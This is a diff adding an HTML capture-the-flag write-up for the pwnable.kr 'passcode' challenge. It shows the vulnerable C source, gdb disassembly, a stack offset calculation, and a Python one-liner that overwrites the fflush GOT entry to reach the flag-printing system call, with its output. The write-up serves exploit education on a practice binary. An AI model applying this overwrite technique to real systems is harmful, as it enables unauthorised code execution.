@@ -1,0 +1,163 @@
+<head>
+    <title>pwnable.kr - passcode writeup</title>
+</head>
+
+<body>
+    <p style="display: block; white-space: pre-wrap;">
+    So let's start by looking at the source code. the hint said there was a compiler warning. let's look for it:
+
+    <code style="display: block; white-space: pre-wrap;">
+        #include &lt;stdio.h&gt;
+        #include &lt;stdlib.h&gt;
+
+        void login(){
+        int passcode1;
+        int passcode2;
+
+        printf("enter passcode1 : ");
+        (*) scanf("%d", passcode1);
+        fflush(stdin);
+
+        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+        printf("enter passcode2 : ");
+        (**) scanf("%d", passcode2);
+
+        printf("checking...\n");
+        if(passcode1==338150 &amp;&amp; passcode2==13371337){
+        printf("Login OK!\n");
+        system("/bin/cat flag");
+        }
+        else{
+        printf("Login Failed!\n");
+        exit(0);
+        }
+        }
+
+        void welcome(){
+        char name[100];
+        printf("enter you name : ");
+        scanf("%100s", name);
+        printf("Welcome %s!\n", name);
+        }
+
+        int main(){
+        printf("Toddler's Secure Login System 1.0 beta.\n");
+
+        welcome();
+        login();
+
+        // something after login...
+        printf("Now I can safely trust you that you have credential :)\n");
+        return 0;	
+        }
+    </code>
+
+    Ah, notice (*) and (**). When we want to scanf an integer into an int variable (or any other non pointer type), we call scanf("%d (or other type)", &amp;variable) to scan to the **value** of the variable.
+    But here, we don't pass a reference to the variable but instead pass the variable itself. so we overwrite the variable's address. As we can see, there's another scanf call at welcome. So we can write to
+    100 chars from the name buffer. If we have something that we want to overwrite within that range, we can do that. Now, because we can overwrite the address of the passcode variables, we can set them
+    in the 100 chars range from the buffer. Let's look at the disassembly of the login function:
+
+    <code style="display: block; white-space: pre-wrap;">
+
+        0x08048564 &lt;+0&gt;:	push   %ebp
+        0x08048565 &lt;+1&gt;:	mov    %esp,%ebp
+        0x08048567 &lt;+3&gt;:	sub    $0x28,%esp
+        0x0804856a &lt;+6&gt;:	mov    $0x8048770,%eax
+        0x0804856f &lt;+11&gt;:	mov    %eax,(%esp)
+        0x08048572 &lt;+14&gt;:	call   0x8048420 &lt;printf@plt&gt;
+        0x08048577 &lt;+19&gt;:	mov    $0x8048783,%eax
+        0x0804857c &lt;+24&gt;:	mov    -0x10(%ebp),%edx
+        0x0804857f &lt;+27&gt;:	mov    %edx,0x4(%esp)
+        0x08048583 &lt;+31&gt;:	mov    %eax,(%esp)
+        0x08048586 &lt;+34&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+        0x0804858b &lt;+39&gt;:	mov    0x804a02c,%eax
+        0x08048590 &lt;+44&gt;:	mov    %eax,(%esp)
+        0x08048593 &lt;+47&gt;:	call   0x8048430 &lt;fflush@plt&gt;
+        0x08048598 &lt;+52&gt;:	mov    $0x8048786,%eax
+        0x0804859d &lt;+57&gt;:	mov    %eax,(%esp)
+        0x080485a0 &lt;+60&gt;:	call   0x8048420 &lt;printf@plt&gt;
+        0x080485a5 &lt;+65&gt;:	mov    $0x8048783,%eax
+        0x080485aa &lt;+70&gt;:	mov    -0xc(%ebp),%edx
+        0x080485ad &lt;+73&gt;:	mov    %edx,0x4(%esp)
+        0x080485b1 &lt;+77&gt;:	mov    %eax,(%esp)
+        0x080485b4 &lt;+80&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+        0x080485b9 &lt;+85&gt;:	movl   $0x8048799,(%esp)
+        0x080485c0 &lt;+92&gt;:	call   0x8048450 &lt;puts@plt&gt;
+        0x080485c5 &lt;+97&gt;:	cmpl   $0x528e6,-0x10(%ebp)
+        0x080485cc &lt;+104&gt;:	jne    0x80485f1 &lt;login+141&gt;
+        0x080485ce &lt;+106&gt;:	cmpl   $0xcc07c9,-0xc(%ebp)
+        0x080485d5 &lt;+113&gt;:	jne    0x80485f1 &lt;login+141&gt;
+        0x080485d7 &lt;+115&gt;:	movl   $0x80487a5,(%esp)
+        0x080485de &lt;+122&gt;:	call   0x8048450 &lt;puts@plt&gt;
+        0x080485e3 &lt;+127&gt;:	movl   $0x80487af,(%esp)
+        0x080485ea &lt;+134&gt;:	call   0x8048460 &lt;system@plt&gt;
+        0x080485ef &lt;+139&gt;:	leave
+        0x080485f0 &lt;+140&gt;:	ret
+        0x080485f1 &lt;+141&gt;:	movl   $0x80487bd,(%esp)
+        0x080485f8 &lt;+148&gt;:	call   0x8048450 &lt;puts@plt&gt;
+        0x080485fd &lt;+153&gt;:	movl   $0x0,(%esp)
+        0x08048604 &lt;+160&gt;:	call   0x8048480 &lt;exit@plt&gt;
+    </code>
+
+    We can see that %ebp-0x10 is the location of passcode1. Let's look at the welcome function:
+
+    <code style="display: block; white-space: pre-wrap;">
+
+        0x08048609 &lt;+0&gt;:	push   %ebp
+        0x0804860a &lt;+1&gt;:	mov    %esp,%ebp
+        0x0804860c &lt;+3&gt;:	sub    $0x88,%esp
+        0x08048612 &lt;+9&gt;:	mov    %gs:0x14,%eax
+        0x08048618 &lt;+15&gt;:	mov    %eax,-0xc(%ebp)
+        0x0804861b &lt;+18&gt;:	xor    %eax,%eax
+        0x0804861d &lt;+20&gt;:	mov    $0x80487cb,%eax
+        0x08048622 &lt;+25&gt;:	mov    %eax,(%esp)
+        0x08048625 &lt;+28&gt;:	call   0x8048420 &lt;printf@plt&gt;
+        0x0804862a &lt;+33&gt;:	mov    $0x80487dd,%eax
+        0x0804862f &lt;+38&gt;:	lea    -0x70(%ebp),%edx
+        0x08048632 &lt;+41&gt;:	mov    %edx,0x4(%esp)
+        0x08048636 &lt;+45&gt;:	mov    %eax,(%esp)
+        0x08048639 &lt;+48&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;
+        0x0804863e &lt;+53&gt;:	mov    $0x80487e3,%eax
+        0x08048643 &lt;+58&gt;:	lea    -0x70(%ebp),%edx
+        0x08048646 &lt;+61&gt;:	mov    %edx,0x4(%esp)
+        0x0804864a &lt;+65&gt;:	mov    %eax,(%esp)
+        0x0804864d &lt;+68&gt;:	call   0x8048420 &lt;printf@plt&gt;
+        0x08048652 &lt;+73&gt;:	mov    -0xc(%ebp),%eax
+        0x08048655 &lt;+76&gt;:	xor    %gs:0x14,%eax
+        0x0804865c &lt;+83&gt;:	je     0x8048663 &lt;welcome+90&gt;
+        0x0804865e &lt;+85&gt;:	call   0x8048440 &lt;__stack_chk_fail@plt&gt;
+        0x08048663 &lt;+90&gt;:	leave  
+        0x08048664 &lt;+91&gt;:	ret    
+    </code>
+
+    So the name buffer is at %ebp-0x70. that means the offset between theme is %ebp-0x70-(%ebp-0x10) = %ebp-0x70-%ebp+0x10 = -0x60 = -96. So we need 96 padding characters. Then, we can overwrite the fflush function
+    with the part that prints the flag. So let's find the addresses:
+
+    the flag part is at 0x080485de.
+    the fflush is at
+
+    <code style="display: block; white-space: pre-wrap;">
+        (gdb) disas fflush
+        Dump of assembler code for function fflush@plt:
+        0x08048430 &lt;+0&gt;:	jmp    *0x804a004
+        0x08048436 &lt;+6&gt;:	push   $0x8
+        0x0804843b &lt;+11&gt;:	jmp    0x8048410
+        End of assembler dump.
+    </code>
+
+    at 0x804a004. let's do this:
+
+    <code style="display: block; white-space: pre-wrap;">
+        passcode@pwnable:~$ python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514142"' | ./passcode 
+        Toddler's Secure Login System 1.0 beta.
+        enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+        enter passcode1 : ���$�{������U�T$�$������$������}��(
+        ******************************************
+        Now I can safely trust you that you have credential :)
+    </code>
+
+    We got it!
+
+    EOF
+    </p>
+</body>
